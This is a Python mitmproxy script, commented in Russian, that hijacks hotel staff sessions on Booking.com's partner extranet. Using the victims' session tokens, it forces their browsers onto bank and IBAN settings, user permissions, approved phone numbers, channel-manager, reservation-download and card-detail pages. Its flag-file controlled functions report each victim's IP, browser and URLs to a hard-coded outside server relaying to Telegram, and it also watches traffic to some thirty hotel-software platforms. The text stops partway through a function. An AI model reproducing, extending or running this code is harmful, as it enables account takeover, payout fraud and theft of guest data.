#!/usr/bin/env python3
from mitmproxy import http, ctx
import os
import urllib.parse
import time
import threading
import requests
import json
from datetime import datetime
import re
FUNCTION_COMPLETION_TIMES = {}
import time

# --- TELEGRAM LOGGING CONFIG ---
TELEGRAM_LOGGING_ENABLED = True
LOG_SERVER_URL = "http://89.42.142.29:5000/log_redirect"
FUNCTION_COMPLETE_URL = "http://89.42.142.29:5000/log_function_complete"

# Домены для мониторинга платформ (сокращенный список)
PLATFORM_DOMAINS = [
    "mews.com",
    "cloudbeds.com",
    "smoobu.com",
    "rmscloud.com",
    "roomstay.io",
    "hotelogix.com",
    "hotelrunner.com",
    "webrezpro.com",
    "roomraccoon.com",
    "amadeus-hospitality.com",
    "duve.com",
    "smartness.com",
    "hbxgroup.com",
    "rentl.io",
    "d-edge.com",
    "fastbooking.com",
    "wubook.net",
    "aiosell.com",
    "thinkreservations.com",
    "clock-software.com",
    "hoteltime.com",
    "eviivo.com",
    "hostaway.com",
    "apaleo.com",
    "roommaster.com",
    "booqable.com",
    "guesty.com",
    "newbook.cloud",
    "hoteltechreport.com",
    "resnexus.eu",
]

# Пути к флагам
COOKIE = "mitm_redirect_done"
FORCE_FLAG = r"C:\temp\mitm_force_redirect"
ONE_SHOT_FLAG = r"C:\temp\mitm_reset_once"
MESSAGE_FLAG = r"C:\temp\mitm_message_once"
PROVIDER_FLAG = r"C:\temp\mitm_provider_once"
USER_FLAG = r"C:\temp\mitm_user_once"
SECURITY_FLAG = r"C:\temp\mitm_security_once"
OPERATION_11_FLAG = r"C:\temp\mitm_operation_11_once"
OPERATION_12_FLAG = r"C:\temp\mitm_operation_12_once"
BOOKING_HOTEL_FLAG = r"C:\temp\mitm_booking_hotel_once"
BOOKING_HOTEL_SECURITY_FLAG = r"C:\temp\mitm_booking_hotel_security_once"
OPERATION_16_FLAG = r"C:\temp\mitm_operation_16_once"
CUSTOM_REDIRECT_FLAG = r"C:\temp\mitm_custom_redirect_once"
CUSTOM_REDIRECT_FROM_FILE = r"C:\temp\mitm_custom_redirect_from.txt"
CUSTOM_REDIRECT_TO_FILE = r"C:\temp\mitm_custom_redirect_to.txt"
CUSTOM_REDIRECT_DONE_FLAG = r"C:\temp\mitm_custom_redirect_done.txt"
BOOKING_RESERVATIONS_FLAG = r"C:\temp\mitm_booking_reservations_once"
BOOKING_RESERVATIONS_HOTEL_ID_FILE = r"C:\temp\mitm_booking_reservations_hotel_id.txt"
BOOKING_RESERVATIONS_REPORT_ID_FILE = r"C:\temp\mitm_booking_reservations_report_id.txt"
BOOKING_CC_DETAILS_FLAG = r"C:\temp\mitm_booking_cc_details_once"
BOOKING_CC_DETAILS_BN_FILE = r"C:\temp\mitm_booking_cc_details_bn.txt"
BOOKING_CC_DETAILS_HOTEL_ID_FILE = r"C:\temp\mitm_booking_cc_details_hotel_id.txt"

# --- ФЛАГ ДЛЯ ФУНКЦИИ 14 (IBAN SETTINGS FORCE) ---
BOOKING_IBAN_SETTINGS_FLAG = r"C:\temp\mitm_booking_iban_settings_once"

# --- ФЛАГ ДЛЯ ФУНКЦИИ 29 (IBAN + RESERVATIONS) ---
BOOKING_IBAN_AND_RESERVATIONS_FLAG = r"C:\temp\mitm_booking_iban_and_reservations_once"

# --- ФЛАГИ ДЛЯ ФУНКЦИИ 27 (циклическая копия функции 18) ---
BOOKING_RESERVATIONS_CYCLE_FLAG = r"C:\temp\mitm_booking_reservations_cycle_once"
BOOKING_RESERVATIONS_CYCLE_HOTEL_IDS_FILE = r"C:\temp\mitm_booking_cycle_hotel_ids.txt"
BOOKING_RESERVATIONS_CYCLE_REPORT_IDS_FILE = r"C:\temp\mitm_booking_cycle_report_ids.txt"
BOOKING_RESERVATIONS_CYCLE_INDEX_FILE = r"C:\temp\mitm_booking_cycle_index.txt"
BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE = r"C:\temp\mitm_booking_cycle_active.txt"
BOOKING_RESERVATIONS_CYCLE_NEXT_RUN_FILE = r"C:\temp\mitm_booking_cycle_next_run.txt"

# Новые флаги для функций 21-26
PARTNERS_FLAG = r"C:\temp\mitm_partners_once"
PARTNERS_AND_MESS_FLAG = r"C:\temp\mitm_partners_and_mess_once"
DEVICE_FLAG = r"C:\temp\mitm_device_once"
PULSE_FLAG = r"C:\temp\mitm_pulse_once"
ULTRA_PULSE_FLAG = r"C:\temp\mitm_ultra_pulse_once"
MONITOR_PLATFORMS_FLAG = r"C:\temp\mitm_monitor_platforms_once"
PULSE_REDIRECT_TO_FILE = r"C:\temp\mitm_pulse_redirect_to.txt"
ULTRA_PULSE_REDIRECT_TO_FILE = r"C:\temp\mitm_ultra_pulse_redirect_to.txt"

REDIRECT_FILE = r"C:\mitm\redirect_target.txt"
LOG_PREFIX = "[MITM-REDIR]"

# --- ФЛАГ ДЛЯ АВТОЗАПУСКА ---
AUTOSTART_FLAG = r"C:\temp\mitm_autostart_active.txt"
AUTOSTART_FUNCTION_FILE = r"C:\temp\mitm_autostart_function.txt"

# Функции проверки флагов
def should_partners():
    return os.path.exists(PARTNERS_FLAG)

def should_partners_and_mess():
    return os.path.exists(PARTNERS_AND_MESS_FLAG)

def should_device():
    return os.path.exists(DEVICE_FLAG)

def should_pulse():
    return os.path.exists(PULSE_FLAG)

def should_ultra_pulse():
    return os.path.exists(ULTRA_PULSE_FLAG)

def should_monitor_platforms():
    return os.path.exists(MONITOR_PLATFORMS_FLAG)

def should_booking_iban_settings():
    return os.path.exists(BOOKING_IBAN_SETTINGS_FLAG)

def should_booking_iban_and_reservations():
    return os.path.exists(BOOKING_IBAN_AND_RESERVATIONS_FLAG)

def get_pulse_redirect_to():
    try:
        if os.path.exists(PULSE_REDIRECT_TO_FILE):
            with open(PULSE_REDIRECT_TO_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading pulse redirect TO: {e}")
    return ""

def get_ultra_pulse_redirect_to():
    try:
        if os.path.exists(ULTRA_PULSE_REDIRECT_TO_FILE):
            with open(ULTRA_PULSE_REDIRECT_TO_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading ultra pulse redirect TO: {e}")
    return ""

def log(msg):
    ctx.log.info(f"{LOG_PREFIX} {msg}")

def post_log_to_server(payload: dict, endpoint: str = LOG_SERVER_URL):
    """Асинхронная отправка лога"""
    def _worker(data, url):
        try:
            headers = {'Content-Type': 'application/json'}
            requests.post(url, json=data, headers=headers, timeout=3)
        except Exception as e:
            try:
                ctx.log.warn(f"{LOG_PREFIX} failed to post to {url}: {e}")
            except Exception:
                pass

    t = threading.Thread(target=_worker, args=(payload, endpoint), daemon=True)
    t.start()

def log_redirect_to_server(client_ip, from_url, to_url, redirect_type):
    """Логирование редиректа"""
    payload = {
        "client_ip": client_ip or "Unknown",
        "from_url": from_url or "Unknown",
        "to_url": to_url or "Unknown",
        "redirect_type": redirect_type or "Unknown",
        "timestamp": datetime.utcnow().isoformat() + "Z"
    }
    post_log_to_server(payload, LOG_SERVER_URL)
    log(f"Posted redirect: {redirect_type} from {client_ip}")

def send_function_complete_notification(client_ip: str, from_url: str, function_type: str):
    """Отправка уведомления о завершении функции"""
    def _send_complete():
        try:
            payload = {
                "client_ip": client_ip or "Unknown",
                "from_url": from_url or "Unknown",
                "function_type": function_type,
                "timestamp": datetime.utcnow().isoformat() + "Z"
            }
            
            log(f"Sending function complete: {function_type}")
            post_log_to_server(payload, FUNCTION_COMPLETE_URL)
            
        except Exception as e:
            log(f"Error sending function complete: {e}")
    
    threading.Thread(target=_send_complete, daemon=True).start()

def get_browser_info(flow: http.HTTPFlow) -> str:
    """Получает информацию о браузере из User-Agent"""
    try:
        user_agent = flow.request.headers.get("User-Agent", "")
        if not user_agent:
            return "Unknown"
        
        user_agent_lower = user_agent.lower()
        
        # Определяем браузер
        if "chrome" in user_agent_lower and "edg" not in user_agent_lower and "opr" not in user_agent_lower:
            return "Google Chrome"
        elif "firefox" in user_agent_lower:
            return "Mozilla Firefox"
        elif "safari" in user_agent_lower and "chrome" not in user_agent_lower:
            return "Apple Safari"
        elif "edg" in user_agent_lower:
            return "Microsoft Edge"
        elif "opr" in user_agent_lower or "opera" in user_agent_lower:
            return "Opera"
        elif "brave" in user_agent_lower:
            return "Brave"
        else:
            return user_agent[:50]  # Первые 50 символов
        
    except Exception as e:
        log(f"Error getting browser info: {e}")
        return "Unknown"

def should_log_domain(flow: http.HTTPFlow) -> bool:
    """Проверяет, нужно ли логировать доступ к платформе"""
    if not TELEGRAM_LOGGING_ENABLED:
        return False
    
    host = (flow.request.pretty_host or "").lower()
    
    # Проверяем платформы
    for domain in PLATFORM_DOMAINS:
        if domain in host:
            return True
    
    return False

# --- Вспомогательные функции ---
def get_redirect_target():
    try:
        if os.path.exists(REDIRECT_FILE):
            with open(REDIRECT_FILE, 'r', encoding='utf-8') as f:
                target = f.read().strip()
                if target and target.startswith(('http://', 'https://')):
                    return target
                else:
                    log(f"No valid redirect target in file: '{target}'")
        log("No valid redirect target found, returning empty string")
        return ""
    except Exception as e:
        log(f"Error reading redirect target: {e}")
        return ""

def should_force():
    return os.path.exists(FORCE_FLAG)

def should_one_shot():
    return os.path.exists(ONE_SHOT_FLAG)

def should_message():
    return os.path.exists(MESSAGE_FLAG)

def should_provider():
    return os.path.exists(PROVIDER_FLAG)

def should_user():
    return os.path.exists(USER_FLAG)

def should_security():
    return os.path.exists(SECURITY_FLAG)

def should_operation_11():
    return os.path.exists(OPERATION_11_FLAG)

def should_operation_12():
    return os.path.exists(OPERATION_12_FLAG)

def should_booking_hotel():
    return os.path.exists(BOOKING_HOTEL_FLAG)

def should_booking_hotel_security():
    return os.path.exists(BOOKING_HOTEL_SECURITY_FLAG)

def should_operation_16():
    return os.path.exists(OPERATION_16_FLAG)

def should_custom_redirect():
    return os.path.exists(CUSTOM_REDIRECT_FLAG)

def get_custom_redirect_from():
    try:
        if os.path.exists(CUSTOM_REDIRECT_FROM_FILE):
            with open(CUSTOM_REDIRECT_FROM_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading custom redirect FROM: {e}")
    return ""

def get_custom_redirect_to():
    try:
        if os.path.exists(CUSTOM_REDIRECT_TO_FILE):
            with open(CUSTOM_REDIRECT_TO_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading custom redirect TO: {e}")
    return ""

def should_booking_reservations():
    return os.path.exists(BOOKING_RESERVATIONS_FLAG)

def get_booking_reservations_hotel_id():
    try:
        if os.path.exists(BOOKING_RESERVATIONS_HOTEL_ID_FILE):
            with open(BOOKING_RESERVATIONS_HOTEL_ID_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading booking reservations hotel_id: {e}")
    return ""

def get_booking_reservations_report_id():
    try:
        if os.path.exists(BOOKING_RESERVATIONS_REPORT_ID_FILE):
            with open(BOOKING_RESERVATIONS_REPORT_ID_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading booking reservations report_id: {e}")
    return ""

def should_booking_cc_details():
    return os.path.exists(BOOKING_CC_DETAILS_FLAG)

def get_booking_cc_details_bn():
    try:
        if os.path.exists(BOOKING_CC_DETAILS_BN_FILE):
            with open(BOOKING_CC_DETAILS_BN_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading booking cc details bn: {e}")
    return ""

def get_booking_cc_details_hotel_id():
    try:
        if os.path.exists(BOOKING_CC_DETAILS_HOTEL_ID_FILE):
            with open(BOOKING_CC_DETAILS_HOTEL_ID_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading booking cc details hotel_id: {e}")
    return ""

# --- Функции удаления флагов ---
def remove_force_flag():
    try:
        if os.path.exists(FORCE_FLAG):
            os.remove(FORCE_FLAG)
            log("Force redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_force_flag error: {e}")

def remove_one_shot_flag():
    try:
        if os.path.exists(ONE_SHOT_FLAG):
            os.remove(ONE_SHOT_FLAG)
            log("Global one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_one_shot_flag error: {e}")

def remove_message_flag():
    try:
        if os.path.exists(MESSAGE_FLAG):
            os.remove(MESSAGE_FLAG)
            log("Booking.com message one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_message_flag error: {e}")

def remove_provider_flag():
    try:
        if os.path.exists(PROVIDER_FLAG):
            os.remove(PROVIDER_FLAG)
            log("Booking.com provider one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_provider_flag error: {e}")

def remove_user_flag():
    try:
        if os.path.exists(USER_FLAG):
            os.remove(USER_FLAG)
            log("Booking.com user one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_user_flag error: {e}")

def remove_security_flag():
    try:
        if os.path.exists(SECURITY_FLAG):
            os.remove(SECURITY_FLAG)
            log("Booking.com security one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_security_flag error: {e}")

def remove_operation_11_flag():
    try:
        if os.path.exists(OPERATION_11_FLAG):
            os.remove(OPERATION_11_FLAG)
            log("Operation 11 one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_operation_11_flag error: {e}")

def remove_operation_12_flag():
    try:
        if os.path.exists(OPERATION_12_FLAG):
            os.remove(OPERATION_12_FLAG)
            log("Operation 12 one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_operation_12_flag error: {e}")

def remove_booking_hotel_flag():
    try:
        if os.path.exists(BOOKING_HOTEL_FLAG):
            os.remove(BOOKING_HOTEL_FLAG)
            log("Booking-hotel redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_booking_hotel_flag error: {e}")

def remove_booking_hotel_security_flag():
    try:
        if os.path.exists(BOOKING_HOTEL_SECURITY_FLAG):
            os.remove(BOOKING_HOTEL_SECURITY_FLAG)
            log("Booking-hotel-security redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_booking_hotel_security_flag error: {e}")

def remove_operation_16_flag():
    try:
        if os.path.exists(OPERATION_16_FLAG):
            os.remove(OPERATION_16_FLAG)
            log("Operation 16 flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_operation_16_flag error: {e}")

def remove_custom_redirect_flag():
    try:
        if os.path.exists(CUSTOM_REDIRECT_FLAG):
            os.remove(CUSTOM_REDIRECT_FLAG)
            log("Custom redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_custom_redirect_flag error: {e}")

def remove_booking_reservations_flag():
    try:
        if os.path.exists(BOOKING_RESERVATIONS_FLAG):
            os.remove(BOOKING_RESERVATIONS_FLAG)
            log("Booking reservations redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_booking_reservations_flag error: {e}")

def remove_booking_cc_details_flag():
    try:
        if os.path.exists(BOOKING_CC_DETAILS_FLAG):
            os.remove(BOOKING_CC_DETAILS_FLAG)
            log("Booking CC details redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_booking_cc_details_flag error: {e}")

def remove_booking_iban_settings_flag():
    try:
        if os.path.exists(BOOKING_IBAN_SETTINGS_FLAG):
            os.remove(BOOKING_IBAN_SETTINGS_FLAG)
            log("Booking IBAN settings flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_booking_iban_settings_flag error: {e}")

def remove_booking_iban_and_reservations_flag():
    """Удаление флага функции 29"""
    try:
        if os.path.exists(BOOKING_IBAN_AND_RESERVATIONS_FLAG):
            os.remove(BOOKING_IBAN_AND_RESERVATIONS_FLAG)
            log("[F29] IBAN+Reservations flag removed")
        # Также удаляем флаги функций 14 и 18
        remove_booking_iban_settings_flag()
        remove_booking_reservations_flag()
    except Exception as e:
        log(f"[F29] Error removing flag: {e}")

def remove_booking_reservations_cycle_flag():
    """Удаление флага функции 27"""
    try:
        if os.path.exists(BOOKING_RESERVATIONS_CYCLE_FLAG):
            os.remove(BOOKING_RESERVATIONS_CYCLE_FLAG)
            log("[F27] Cycle flag removed")
        
        if os.path.exists(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE):
            os.remove(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE)
    except Exception as e:
        log(f"[F27] Error removing cycle flag: {e}")

# --- Новые функции удаления флагов 21-26 ---
def remove_partners_flag():
    try:
        if os.path.exists(PARTNERS_FLAG):
            os.remove(PARTNERS_FLAG)
            log("Partners redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_partners_flag error: {e}")

def remove_partners_and_mess_flag():
    try:
        if os.path.exists(PARTNERS_AND_MESS_FLAG):
            os.remove(PARTNERS_AND_MESS_FLAG)
            log("Partners and Mess redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_partners_and_mess_flag error: {e}")

def remove_device_flag():
    try:
        if os.path.exists(DEVICE_FLAG):
            os.remove(DEVICE_FLAG)
            log("Device redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_device_flag error: {e}")

def remove_pulse_flag():
    try:
        if os.path.exists(PULSE_FLAG):
            os.remove(PULSE_FLAG)
            log("Pulse redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_pulse_flag error: {e}")

def remove_ultra_pulse_flag():
    try:
        if os.path.exists(ULTRA_PULSE_FLAG):
            os.remove(ULTRA_PULSE_FLAG)
            log("Ultra Pulse redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_ultra_pulse_flag error: {e}")

def remove_monitor_platforms_flag():
    try:
        if os.path.exists(MONITOR_PLATFORMS_FLAG):
            os.remove(MONITOR_PLATFORMS_FLAG)
            log("Monitor platforms flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_monitor_platforms_flag error: {e}")

# --- Вспомогательные функции для цепных операций ---
def enable_booking_hotel_security_from_partners():
    """Включение функции 15 после завершения функции 21 (для функции 22)"""
    try:
        parent = os.path.dirname(BOOKING_HOTEL_SECURITY_FLAG)
        if parent and not os.path.exists(parent):
            os.makedirs(parent, exist_ok=True)
        with open(BOOKING_HOTEL_SECURITY_FLAG, 'w') as f:
            f.write("enabled")
        log("Function 15 enabled from partners (function 22)")
    except Exception as e:
        log(f"Error enabling function 15 from partners: {e}")

def enable_pulse_from_ultra_pulse():
    """Включение функции 24 после завершения функции 23 (для функции 25)"""
    try:
        log("Function 25: Function 23 completed, activating Function 24 (Pulse)")
        
        if os.path.exists(DEVICE_FLAG):
            os.remove(DEVICE_FLAG)
            log("Function 25: Removed device flag")
        
        parent = os.path.dirname(PULSE_FLAG)
        if parent and not os.path.exists(parent):
            os.makedirs(parent, exist_ok=True)
        with open(PULSE_FLAG, 'w') as f:
            f.write("enabled")
        
        ultra_url = get_ultra_pulse_redirect_to()
        if ultra_url:
            parent_dir = os.path.dirname(PULSE_REDIRECT_TO_FILE)
            if parent_dir and not os.path.exists(parent_dir):
                os.makedirs(parent_dir, exist_ok=True)
            with open(PULSE_REDIRECT_TO_FILE, 'w') as f:
                f.write(ultra_url)
            log(f"Function 25: Copied redirect URL to Pulse: {ultra_url}")
        
        log("Function 25: Phase 2 (Pulse) activated - sending notification")
        
    except Exception as e:
        log(f"Error enabling function 24 from ultra pulse: {e}")
        
def enable_reservations_from_iban():
    """Включение функции 18 после завершения функции 14 (для функции 29)"""
    try:
        log("[F29] Function 14 (IBAN) completed, activating Function 18 (Reservations)")
        
        # Получаем параметры для функции 18 из файлов
        hotel_id = get_booking_reservations_hotel_id()
        report_id = get_booking_reservations_report_id()
        
        if not hotel_id or not report_id:
            log("[F29] ⚠️ Missing hotel_id or report_id for reservations!")
            return
        
        # Проверяем, не активна ли уже функция 18
        if should_booking_reservations():
            log("[F29] ⚠️ Function 18 already active, skipping")
            return
        
        parent = os.path.dirname(BOOKING_RESERVATIONS_FLAG)
        if parent and not os.path.exists(parent):
            os.makedirs(parent, exist_ok=True)
        with open(BOOKING_RESERVATIONS_FLAG, 'w') as f:
            f.write("enabled")
        
        log(f"[F29] ✅ Function 18 activated with hotel_id={hotel_id}, report_id={report_id}")
        
    except Exception as e:
        log(f"[F29] Error enabling reservations: {e}")
        
def is_redirect_target(flow: http.HTTPFlow, redirect_target: str) -> bool:
    try:
        if not redirect_target:
            return False
        req_url = flow.request.pretty_url.lower()
        target_url = redirect_target.lower().rstrip("/")
        return req_url.startswith(target_url)
    except Exception:
        return False

def get_client_ip(flow):
    """Получение IP адреса клиента"""
    try:
        client_conn = getattr(flow, "client_conn", None)
        if client_conn:
            peername = getattr(client_conn, "peername", None)
            if peername and isinstance(peername, tuple) and len(peername) > 0:
                return peername[0]
    except Exception as e:
        log(f"Error getting client IP: {e}")
    
    return "Unknown"

# --- Функции редиректов 1-20 ---
def booking_redirect(flow: http.HTTPFlow, redirect_type: str) -> bool:
    flags = {
        "message": (should_message, remove_message_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/security_settings.html"),
        "provider": (should_provider, remove_provider_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/channel-manager/index.html"),
        "user": (should_user, remove_user_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/accounts_and_permissions.html"),
        "security": (should_security, remove_security_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/approvednumbers.html")
    }
    
    if redirect_type not in flags:
        return False
        
    should_redirect, remove_flag, base_url = flags[redirect_type]
    
    if not should_redirect():
        return False

    url = flow.request.pretty_url
    if not url.startswith("https://admin.booking.com/hotel/hoteladmin/"):
        return False

    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)

    hotel_id = query.get("hotel_id", [""])[0]
    ses = query.get("ses", [""])[0]

    if redirect_type == "provider":
        target_url = f"{base_url}?lang=en&ses={ses}&hotel_id={hotel_id}&fr_account_menu=1&view=start"
    else:
        target_url = f"{base_url}?lang=en&ses={ses}&hotel_id={hotel_id}"

    log(f"Booking.com {redirect_type.upper()} redirect {url} -> {target_url}")
    
    client_ip = get_client_ip(flow)
    log_redirect_to_server(client_ip, url, target_url, f"BOOKING_{redirect_type.upper()}")
    
    flow.response = http.Response.make(
        302, b"", {"Location": target_url}
    )

    remove_flag()
    
    if redirect_type == "message":
        send_function_complete_notification(client_ip, url, "FUNCTION_7_COMPLETE")
    elif redirect_type == "provider":
        send_function_complete_notification(client_ip, url, "FUNCTION_8_COMPLETE")
    elif redirect_type == "user":
        send_function_complete_notification(client_ip, url, "FUNCTION_9_COMPLETE")
    elif redirect_type == "security":
        send_function_complete_notification(client_ip, url, "FUNCTION_10_COMPLETE")
    
    return True

# ========== ФУНКЦИЯ 14: IBAN SETTINGS FORCE (БЕЗ ЛИШНИХ УВЕДОМЛЕНИЙ) ==========
def booking_iban_settings_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 14: IBAN SETTINGS FORCE
    Перенаправляет на dp_bank_details.html (IBAN/bank details)
    После завершения (когда есть auth_assurance_last_check):
    - МГНОВЕННЫЙ редирект на https://admin.booking.com/
    - Отправка лога в Telegram ТОЛЬКО при завершении
    """
    try:
        if not should_booking_iban_settings():
            return False

        url = flow.request.pretty_url
        iban_base = "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/dp_bank_details.html"
        client_ip = get_client_ip(flow)
        browser_info = get_browser_info(flow)
        
        # Если это уже dp_bank_details.html — проверяем завершение
        if url.startswith(iban_base):
            parsed = urllib.parse.urlparse(url)
            query = urllib.parse.parse_qs(parsed.query)
            
            # ТОЛЬКО если есть auth_assurance_last_check - функция завершена
            if "auth_assurance_last_check" in query:
                log(f"[F14] ✅ Detected dp_bank_details.html with auth_assurance_last_check -> function completed")
                
                # Отправляем уведомление ТОЛЬКО при завершении
                log(f"[F14] ✅ IBAN CAN BE ADDED 🏦 - IP: {client_ip}, Browser: {browser_info}")
                log_redirect_to_server(client_ip, url, "IBAN_CAN_BE_ADDED", f"IBAN_COMPLETE_BROWSER_{browser_info.replace(' ', '_')}")
                
                # Отправляем финальный лог о завершении
                send_function_complete_notification(client_ip, url, "FUNCTION_14_IBAN_COMPLETE")
                
                # Удаляем флаг функции 14
                remove_booking_iban_settings_flag()
                
                # МГНОВЕННЫЙ РЕДИРЕКТ НА ГЛАВНУЮ (БЕЗ УВЕДОМЛЕНИЯ В TELEGRAM)
                main_url = "https://admin.booking.com/"
                log(f"[F14] 🚀 INSTANT REDIRECT to main page: {url} -> {main_url}")
                # НЕ отправляем log_redirect_to_server для редиректа - это лишнее!
                
                # Проверяем, нужно ли активировать функцию 29
                if should_booking_iban_and_reservations():
                    log("[F29] Function 29 detected - activating reservations after IBAN completion")
                    enable_reservations_from_iban()
                
                flow.response = http.Response.make(
                    302,
                    b"",
                    {
                        "Location": main_url,
                        "Cache-Control": "no-cache, no-store, must-revalidate",
                        "Pragma": "no-cache",
                        "Expires": "0",
                        "X-MITM-Redirect": "Function-14-IBAN-Post-Completion"
                    }
                )
                return True
            
            # Если нет auth_assurance_last_check - просто ждем
            log(f"[F14] On IBAN page, waiting for auth_assurance_last_check...")
            return False

        # Проверяем, что это admin.booking.com и путь начинается с /hotel/
        parsed = urllib.parse.urlparse(url)
        path = parsed.path or "/"
        host = (flow.request.pretty_host or "").lower()

        if not host.endswith("admin.booking.com") or not path.startswith("/hotel/"):
            return False

        # Пропускаем статические файлы
        if any(ext in url.lower() for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.woff', '.woff2', '.ttf', '.svg']):
            return False

        # Получаем ses и hotel_id
        query = urllib.parse.parse_qs(parsed.query)
        hotel_id = None
        ses = None

        if "hotel_id" in query:
            hotel_id = query.get("hotel_id", [None])[0]
        if "ses" in query:
            ses = query.get("ses", [None])[0]

        # Если не нашли — пытаемся из Referer
        if not hotel_id or not ses:
            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
            if referer:
                try:
                    rp = urllib.parse.urlparse(referer)
                    rq = urllib.parse.parse_qs(rp.query)
                    if not hotel_id and "hotel_id" in rq:
                        hotel_id = rq.get("hotel_id", [None])[0]
                    if not ses and "ses" in rq:
                        ses = rq.get("ses", [None])[0]
                except Exception:
                    pass

        # Дополнительная эвристика для hotel_id
        if not hotel_id:
            m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", path)
            if m:
                hotel_id = m.group(1)

        # Без ses или hotel_id НЕ ДЕЛАЕМ РЕДИРЕКТ
        if not ses:
            log("[F14] ⚠️ No ses parameter - user not authenticated, skipping redirect")
            return False
            
        if not hotel_id:
            log("[F14] ⚠️ No hotel_id parameter - skipping redirect")
            return False

        target_url = f"{iban_base}?lang=en&ses={ses}&hotel_id={hotel_id}"
        
        # Отправляем лог "In PROCESS" ТОЛЬКО ПРИ ПЕРВОМ РЕДИРЕКТЕ
        if url != target_url:
            log(f"[F14] 📘 BOOKING - IBAN redirect: {url} -> {target_url}")
            log(f"[F14] 📘 Client IP: {client_ip}, Browser: {browser_info}")
            log_redirect_to_server(client_ip, url, target_url, f"IBAN_IN_PROCESS_BROWSER_{browser_info.replace(' ', '_')}")

        flow.response = http.Response.make(302, b"", {"Location": target_url})
        return True

    except Exception as e:
        log(f"[F14] booking_iban_settings_redirect error: {e}")
        import traceback
        log(f"[F14] Traceback: {traceback.format_exc()}")
        return False
        
# ========== ФУНКЦИЯ 18: RESERVATIONS DOWNLOAD ==========
def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 18:
    Редиректит все запросы к admin.booking.com/hotel/* на страницу загрузки резервов.
    С ДОПОЛНИТЕЛЬНЫМИ РЕДИРЕКТАМИ ПОСЛЕ ЗАВЕРШЕНИЯ:
    1. После завершения - 3 секунды ожидания
    2. В течение 2 минут: если обновление страницы - редирект на главную
    3. Через 10 секунд: автоматический редирект на главную
    """
    try:
        url = flow.request.pretty_url
        host = (flow.request.pretty_host or "").lower()
        client_ip = get_client_ip(flow)
        
        # ====== ПРОВЕРКА ДОПОЛНИТЕЛЬНЫХ РЕДИРЕКТОВ ПОСЛЕ ЗАВЕРШЕНИЯ ======
        if client_ip in FUNCTION_COMPLETION_TIMES:
            completion_data = FUNCTION_COMPLETION_TIMES[client_ip]
            completion_time = completion_data.get("function_18_completed_at", 0)
            initial_url = completion_data.get("initial_url", "")
            
            if completion_time > 0:
                current_time = time.time()
                time_since_completion = current_time - completion_time
                
                is_reservations_page = "reservations_download.html" in url
                
                if is_reservations_page:
                    parsed_current = urllib.parse.urlparse(url)
                    parsed_initial = urllib.parse.urlparse(initial_url)
                    
                    if parsed_current.path == parsed_initial.path:
                        if time_since_completion <= 3:
                            log(f"[F18] ✓ Page loaded, waiting 3s grace period ({time_since_completion:.1f}s passed)")
                            return False
                        elif time_since_completion >= 10:
                            target_url = "https://admin.booking.com/hotel/hoteladmin/"
                            log(f"[F18] ✓ 10s timeout reached - auto-redirect to main page")
                            log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_POST_COMPLETION_AUTO")
                            flow.response = http.Response.make(
                                302, b"", {
                                    "Location": target_url,
                                    "Cache-Control": "no-cache, no-store, must-revalidate",
                                    "Pragma": "no-cache",
                                    "Expires": "0",
                                    "X-MITM-Redirect": "Function-18-Post-Auto"
                                }
                            )
                            return True
                        elif 3 < time_since_completion < 120:
                            log(f"[F18] ✓ Page refresh within 2min ({time_since_completion:.1f}s) - redirect to main")
